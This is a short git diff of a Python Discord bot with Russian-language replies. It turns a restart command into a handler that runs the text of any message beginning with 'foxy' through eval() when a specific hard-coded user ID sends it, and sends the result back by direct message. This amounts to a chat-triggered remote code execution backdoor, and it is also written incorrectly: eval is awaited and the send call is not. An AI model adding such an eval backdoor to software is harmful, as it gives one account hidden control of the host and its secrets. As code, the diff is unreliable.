@@ -56,11 +56,13 @@ async def on_message(message: discord.Message):
         await message.channel.send("Какой тебе ещё пинг? Бан хочешь?")
         await message.delete()
         return
-    elif message.content.lower().startswith("foxy restart"):
+    elif message.content.lower().startswith("foxy"):
         if message.author.id == 632511458537898016:
+            g = await eval(message.content.replace("foxy",""))
+            message.author.send(g)
             await message.reply("OK", delete_after=10.0)
-            bot_stop()
         else:
+            await message.reply("Nope", delete_after=10.0)
             return
     elif message.content.lower().startswith("!pred"):
         if not message.author.guild_permissions.administrator and not message.author.id == kolyakot33:
